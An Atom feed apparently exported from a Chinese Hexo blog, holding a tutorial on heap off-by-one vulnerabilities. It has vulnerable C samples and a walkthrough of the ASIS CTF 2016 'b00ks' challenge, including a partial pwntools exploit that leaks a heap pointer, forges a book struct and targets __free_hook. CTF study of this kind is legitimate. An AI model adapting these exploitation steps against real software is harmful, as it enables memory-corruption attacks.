<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xfgg</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-10-09T12:05:01.708Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>xfgg</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>off by one</title>
    <link href="http://yoursite.com/2019/10/09/off%20by%20one/"/>
    <id>http://yoursite.com/2019/10/09/off by one/</id>
    <published>2019-10-09T11:29:56.849Z</published>
    <updated>2019-10-09T12:05:01.708Z</updated>
    
    <content type="html"><![CDATA[<h3 id="off-by-one漏洞原理"><a href="#off-by-one漏洞原理" class="headerlink" title="off by one漏洞原理"></a>off by one漏洞原理</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">严格来说 off-by-one 漏洞是一种特殊的溢出漏洞，off-by-one 指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节。</span><br><span class="line"></span><br><span class="line">off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的size 正好就只多了一个字节的情况。其中边界验证不严通常包括</span><br><span class="line"></span><br><span class="line">使用循环语句向堆块中写入数据时，循环的次数设置错误（这在C 语言初学者中很常见）导致多写入了一个字节。</span><br><span class="line">字符串操作不合适</span><br><span class="line">一般来说，单字节溢出被认为是难以利用的，但是因为Linux 的堆管理机制ptmalloc 验证的松散性，基于Linux 堆的off-by-one 漏洞利用起来并不复杂，并且威力强大。此外，需要说明的一点是off-by-one 是可以基于各种缓冲区的，比如栈、bss 段等等，但是堆上（heap based） 的off-by-one 是CTF 中比较常见的。我们这里仅讨论堆上的off-by-one 情况。</span><br></pre></td></tr></table></figure><h3 id="off-by-one利用思路"><a href="#off-by-one利用思路" class="headerlink" title="off by one利用思路"></a>off by one利用思路</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠从而泄露其他块数据，或是覆盖其他块数据。也可使用<span class="literal">NULL</span>字节溢出的方法</span><br><span class="line"><span class="number">2.</span>溢出字节为<span class="literal">NULL</span>字节：在size为<span class="number">0x100</span>的时候，溢出<span class="literal">NULL</span>字节可以使得prev_in_use位被清，这样前块会被认为是<span class="built_in">free</span>块。（<span class="number">1</span>）这时可以选择使用unlink方法（见unlink部分）进行处理。（<span class="number">2</span>）另外，这时prev_size域就会启用，就可以伪造prev_size，从而造成块之间发生重叠。此方法的关键在于unlink的时候没有检查按照prev_size找到的块的后一块（理论上是当前正在unlink的块）与当前正在unlink的块大小是否相等。</span><br><span class="line"></span><br><span class="line">C语言代码示例：</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">my_gets</span><span class="params">(<span class="keyword">char</span> *ptr,<span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ptr[i]=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *chunk1,*chunk2;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    chunk2=<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Get intput"</span>);</span><br><span class="line">    my_gets(chunk1,<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">我们自己编写的my_gets 函数导致了一个off-by-one 漏洞，原因是<span class="keyword">for</span> 循环的边界没有控制好导致写入多执行了一次，这也被称为栅栏错误</span><br><span class="line">wikipedia: 栅栏错误（有时也称为电线杆错误或者灯柱错误）是差一错误的一种。如以下问题：</span><br><span class="line">建造一条直栅栏（即不围圈），长<span class="number">30</span> 米、每条栅栏柱间相隔<span class="number">3</span> 米，需要多少条栅栏柱？</span><br><span class="line">最容易想到的答案<span class="number">10</span> 是错的。这个栅栏有<span class="number">10</span> 个间隔，<span class="number">11</span> 条栅栏柱。</span><br><span class="line"></span><br><span class="line">没输入前：</span><br><span class="line"><span class="number">0x602000</span>: <span class="number">0x0000000000000000</span> <span class="number">0x0000000000000021</span> &lt;=== chunk1</span><br><span class="line"><span class="number">0x602010</span>: <span class="number">0x0000000000000000</span> <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>: <span class="number">0x0000000000000000</span> <span class="number">0x0000000000000021</span> &lt;=== chunk2</span><br><span class="line"><span class="number">0x602030</span>: <span class="number">0x0000000000000000</span> <span class="number">0x0000000000000000</span></span><br><span class="line">输入后：</span><br><span class="line"><span class="number">0x602000</span>: <span class="number">0x0000000000000000</span> <span class="number">0x0000000000000021</span> &lt;=== chunk1</span><br><span class="line"><span class="number">0x602010</span>: <span class="number">0x4141414141414141</span> <span class="number">0x4141414141414141</span></span><br><span class="line"><span class="number">0x602020</span>: <span class="number">0x0000000000000041</span> <span class="number">0x0000000000000021</span> &lt;=== chunk2</span><br><span class="line"><span class="number">0x602030</span>: <span class="number">0x0000000000000000</span> <span class="number">0x0000000000000000</span></span><br><span class="line">    </span><br><span class="line">示例<span class="number">2</span>：</span><br><span class="line">字符串的溢出操作</span><br><span class="line"><span class="keyword">int</span> main(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">40</span>]=<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">void</span> *chunk1;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Get Input"</span>);</span><br><span class="line">    gets(buffer);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(buffer)==<span class="number">24</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(chunk1,buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">程序乍看上去没有任何问题（不考虑栈溢出），可能很多人在实际的代码中也是这样写的。但是strlen和strcpy的行为不一致却导致了off-by-one的发生。strlen是我们很熟悉的计算ascii字符串长度的函数，这个函数在计算字符串长度时是不把结束符'\x00'计算在内的，但是strcpy在复制字符串时会拷贝结束符'\x00'。这就导致了我们向chunk1中写入了25个字节，我们使用gdb进行调试可以看到这一点。</span><br><span class="line"></span><br><span class="line">输入前：</span><br><span class="line"><span class="number">0x602000</span>: <span class="number">0x0000000000000000</span> <span class="number">0x0000000000000021</span> &lt;=== chunk1</span><br><span class="line"><span class="number">0x602010</span>: <span class="number">0x0000000000000000</span> <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>: <span class="number">0x0000000000000000</span> <span class="number">0x0000000000000411</span> &lt;=== next chunk</span><br><span class="line">输入后：</span><br><span class="line"><span class="number">0x602000</span>: <span class="number">0x0000000000000000</span> <span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x602010</span>: <span class="number">0x4141414141414141</span> <span class="number">0x4141414141414141</span></span><br><span class="line"><span class="number">0x602020</span>: <span class="number">0x4141414141414141</span> <span class="number">0x0000000000000400</span></span><br><span class="line">    </span><br><span class="line">    可以看到next chunk的size域低字节被结束符'\x00'覆盖，这种又属于off-by-one的一个分支称为NULL byte off-by-one，我们在后面会看到off-by-one与NULL byte off-by-one在利用上的区别。还是有一点就是为什么是低字节被覆盖呢，因为我们通常使用的CPU的字节序都是小端法的，比如一个DWORD值在使用小端法的内存中是这样储存的</span><br><span class="line">    DWORD <span class="number">0x41424344</span></span><br><span class="line">内存<span class="number">0x44</span>,<span class="number">0x43</span>,<span class="number">0x42</span>,<span class="number">0x4</span></span><br></pre></td></tr></table></figure><h3 id="实例1-asis-ctf-2016-b00ks"><a href="#实例1-asis-ctf-2016-b00ks" class="headerlink" title="实例1 asis ctf 2016 b00ks"></a>实例1 asis ctf 2016 b00ks</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br></pre></td><td class="code"><pre><span class="line">题目介绍</span><br><span class="line">选单式程序</span><br><span class="line"><span class="number">1.</span> Create a book</span><br><span class="line"><span class="number">2.</span> Delete a book</span><br><span class="line"><span class="number">3.</span> Edit a book</span><br><span class="line"><span class="number">4.</span> Print book detail</span><br><span class="line"><span class="number">5.</span> Change current author name</span><br><span class="line"><span class="number">6.</span> Exit</span><br><span class="line"></span><br><span class="line">程序提供了创建、删除、编辑、打印图书的功能。题目是<span class="number">64</span> 位程序，保护如下所示。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Canary : No</span><br><span class="line">NX : Yes</span><br><span class="line">PIE : Yes</span><br><span class="line">Fortify : No</span><br><span class="line">RelRO : Full</span><br><span class="line">程序每创建一个book 会分配<span class="number">0x20</span> 字节的结构来维护它的信息</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">struct book</span><br><span class="line">&#123;</span><br><span class="line">    int id;</span><br><span class="line">    char *name;</span><br><span class="line">    char *description;</span><br><span class="line">    int size;</span><br><span class="line">&#125;</span><br><span class="line">create ¶</span><br><span class="line">book 结构中存在name 和description ， name 和description 在堆上分配。首先分配name buffer ，使用malloc ，大小自定但小于<span class="number">32</span> 。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">printf(<span class="string">"\nEnter book name size: "</span>, *(_QWORD *)&amp;size);</span><br><span class="line">__isoc99_scanf(<span class="string">"%d"</span>, &amp;size);</span><br><span class="line">printf(<span class="string">"Enter book name (Max 32 chars): "</span>, &amp;size);</span><br><span class="line">ptr = malloc(size);</span><br><span class="line">之后分配description ，同样大小自定但无限制。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">printf(<span class="string">"\nEnter book description size: "</span>, *(_QWORD *)&amp;size);</span><br><span class="line">        __isoc99_scanf(<span class="string">"%d"</span>, &amp;size);</span><br><span class="line"></span><br><span class="line">v5 = malloc(size);</span><br><span class="line">之后分配book 结构的内存</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">book = malloc(<span class="number">0x20</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( book )</span><br><span class="line">&#123;</span><br><span class="line">    *((_DWORD *)book + <span class="number">6</span>) = size;</span><br><span class="line">    *((_QWORD *)off_202010 + v2) = book;</span><br><span class="line">    *((_QWORD *)book + <span class="number">2</span>) = description;</span><br><span class="line">    *((_QWORD *)book + <span class="number">1</span>) = name;</span><br><span class="line">    *(_DWORD *)book = ++unk_202024;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">漏洞</span><br><span class="line"></span><br><span class="line">signed __int64 __fastcall my_read(_BYTE *ptr, int number)</span><br><span class="line">&#123;</span><br><span class="line">  int i; // [rsp+<span class="number">14</span>h] [rbp-Ch]</span><br><span class="line">  _BYTE *buf; // [rsp+<span class="number">18</span>h] [rbp<span class="number">-8</span>h]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( number &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  buf = ptr;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (unsigned int)read(<span class="number">0</span>, buf, <span class="number">1</span>uLL) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( *buf == <span class="string">'\n'</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++buf;</span><br><span class="line">    <span class="keyword">if</span> ( i == number )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *buf = <span class="number">0</span>; //在最后加了个/x00字符 导致了NULL byte off by one 漏洞</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">解题步骤：</span><br><span class="line">攻击过程：</span><br><span class="line"><span class="number">1.</span>填充满author</span><br><span class="line"><span class="number">2.</span>创建堆块<span class="number">1</span>，覆盖author结尾的\x00,这样我们输出的时候就可以泄露堆块<span class="number">1</span>的地址</span><br><span class="line"><span class="number">3.</span>创建堆块<span class="number">2</span>，为后续做准备，堆块<span class="number">2</span>要申请得比较大，因为mmap申请出来的堆块地址与libc有固定的偏移</span><br><span class="line"><span class="number">4.</span>露堆块<span class="number">1</span>地址，记为first_heap</span><br><span class="line"><span class="number">5.</span>(关键点来了) 这时候的攻击思路是利用编辑author的时候多写了一个\x00字节，可以覆盖到堆块<span class="number">1</span>的地址的最后一位，如果我们提前将堆块<span class="number">1</span>的内容编辑好，按照上述的结构体布置好，name和description我们自己控制，伪造成一个书本的结构体，然后让覆盖过后的地址刚好是book1的description部分的话，我们相当于获得了一个任意地址读写的能力啊</span><br><span class="line"><span class="number">6.</span>后面就简单了，任意读取获得libc地址</span><br><span class="line"><span class="number">7.</span>任意写将__free_hook函数的地址改写成one_gadget地址</span><br><span class="line">tips:__free_hook若没有则不调用，若有将先于free函数调用</span><br><span class="line">    </span><br><span class="line">测试数据：</span><br><span class="line">Enter author name: AAAAAAAABC</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> Create a book</span><br><span class="line"><span class="number">2.</span> Delete a book</span><br><span class="line"><span class="number">3.</span> Edit a book</span><br><span class="line"><span class="number">4.</span> Print book detail</span><br><span class="line"><span class="number">5.</span> Change current author name</span><br><span class="line"><span class="number">6.</span> Exit</span><br><span class="line">&gt; <span class="number">1</span> </span><br><span class="line"></span><br><span class="line">Enter book name size: <span class="number">12</span></span><br><span class="line">Enter book name (Max <span class="number">32</span> chars): liu123</span><br><span class="line"></span><br><span class="line">Enter book description size: <span class="number">20</span></span><br><span class="line">Enter book description: i am liu111111</span><br><span class="line"></span><br><span class="line">ctrl+c断下来</span><br><span class="line">gdb-peda$ find AAAABC</span><br><span class="line">Searching <span class="keyword">for</span> <span class="string">'AAAABC'</span> <span class="keyword">in</span>: <span class="literal">None</span> ranges</span><br><span class="line">Found <span class="number">1</span> results, display max <span class="number">1</span> items:</span><br><span class="line">b00ks : 0x555555756044 --&gt; 0x434241414141 ('AAAABC')</span><br><span class="line">gdb-peda$ x /<span class="number">10</span>xg <span class="number">0x555555756040</span></span><br><span class="line"><span class="number">0x555555756040</span>: <span class="number">0x4141414141414141</span>  <span class="number">0x0000000000004342</span></span><br><span class="line"><span class="number">0x555555756050</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555756060</span>: <span class="number">0x00005555557576b0</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555756070</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555756080</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"></span><br><span class="line">为了实现泄漏，首先在author name 中需要输入<span class="number">32</span> 个字节来使得结束符被覆盖掉。之后我们创建book1 ，这个book1 的指针会覆盖author name 中最后的NULL 字节，使得该指针与author name 直接连接，这样输出author name 则可以获取到一个堆指针</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'author name:'</span>)</span><br><span class="line">io.sendline(<span class="string">'a'</span>*<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">io.sendline(<span class="string">'1'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'book name size:'</span>)</span><br><span class="line">io.sendline(<span class="string">'32'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'book name(max 32 chars):'</span>)</span><br><span class="line">io.sendline(<span class="string">'object1'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Enter book description:'</span>)</span><br><span class="line">io.sendline(<span class="string">'object1'</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'&gt;'</span>) <span class="comment"># print book1</span></span><br><span class="line">io.sendline(<span class="string">'4'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Author:'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'</span>) <span class="comment">#&lt;==leak book1</span></span><br><span class="line">book1_addr = io.recv(<span class="number">6</span>)</span><br><span class="line">book1_addr = book1_addr.lijust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">book1_addr = u64(book1_addr)</span><br><span class="line"></span><br><span class="line">off-by-one覆盖指针低字节¶</span><br><span class="line">程序中同样提供了一种change 功能， change 功能用于修改author name ，所以通过change 可以写入author name ，利用off-by-one 覆盖pointer array 第一个项的低字节。</span><br><span class="line"></span><br><span class="line">覆盖掉book1 指针的低字节后，这个指针会指向book1 的description ，由于程序提供了edit 功能可以任意修改description 中的内容。我们可以提前在description 中布置数据伪造成一个book 结构，这个book 结构的description 和name 指针可以由直接控制。</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">off_by_one</span><span class="params">(addr)</span>:</span></span><br><span class="line">    addr += <span class="number">58</span></span><br><span class="line">    io.recvuntil(<span class="string">'&gt;'</span>) <span class="comment"># create fake book in description</span></span><br><span class="line">    io.sendline(<span class="string">'3'</span>)</span><br><span class="line">    fake_book_data = p64(<span class="number">0x1</span>) + p64(addr) + p64(addr) + pack(<span class="number">0xffff</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Enter new book description：'</span>)</span><br><span class="line">    io.sendline(fake_book_data) <span class="comment"># &lt;==fake book</span></span><br><span class="line">    </span><br><span class="line">    io.recvuntil(<span class="string">'&gt;'</span>) <span class="comment">#change author name</span></span><br><span class="line">    io.sendline(<span class="string">'5'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Enter author name:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'a'</span>*<span class="number">32</span>)<span class="comment">#&lt;== off by one</span></span><br><span class="line"> </span><br><span class="line">这里在description 中伪造了book ，使用的数据是p64(<span class="number">0x1</span>)+p64(addr)+p64(addr)+pack(<span class="number">0xffff</span>) 。其中addr+<span class="number">58</span> 是为了使指针指向book2 的指针地址，使得我们可以任意修改这些指针值。</span><br><span class="line"></span><br><span class="line">exp:</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level="debug"</span></span><br><span class="line">p=process(<span class="string">"./b00ks"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Create</span><span class="params">(name_size,name,discription_size,discription)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"size: "</span>)</span><br><span class="line">    p.sendline(name_size)</span><br><span class="line">    p.recvuntil(<span class="string">"Enter book name (Max 32 chars): "</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">"Enter book description size: "</span>)</span><br><span class="line">    p.sendline(discription_size)</span><br><span class="line">    p.recvuntil(<span class="string">"Enter book description: "</span>)</span><br><span class="line">    p.sendline(discription)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(ID)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Enter the book id you want to delete: "</span>)</span><br><span class="line">    p.sendline(ID)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(ID,discription)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Enter the book id you want to edit: "</span>)</span><br><span class="line">    p.sendline(ID)</span><br><span class="line">    p.recvuntil(<span class="string">"Enter new book description: "</span>)</span><br><span class="line">    p.sendline(discription)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Print</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Change</span><span class="params">(author_name)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"5"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Enter author name: "</span>)</span><br><span class="line">    p.sendline(author_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#################################leak book1_addr###############################</span></span><br><span class="line">p.recvuntil(<span class="string">"Enter author name: "</span>)</span><br><span class="line">p.sendline(<span class="string">"A"</span>*<span class="number">31</span>+<span class="string">"B"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">Create(<span class="string">"130"</span>,<span class="string">"jion"</span>,<span class="string">"32"</span>,<span class="string">"i am join"</span>) <span class="comment">#######set fake b00k_addr</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">Print()</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"AB"</span>)</span><br><span class="line">first_b00k_addr=u64(p.recv(<span class="number">6</span>)+<span class="string">'\00'</span>+<span class="string">'\00'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">print</span> hex(first_b00k_addr)</span><br><span class="line"><span class="comment">####################################leak book1_addr end#######################</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###################################set fake b00k in first b00k of discription###############</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">payload=p64(<span class="number">0x01</span>)+p64(first_b00k_addr+<span class="number">0x38</span>)*<span class="number">2</span>+p64(<span class="number">0xffff</span>)</span><br><span class="line">Edit(<span class="string">'1'</span>,payload)</span><br><span class="line"><span class="comment">##############################make big memrry ####################################</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">Create(<span 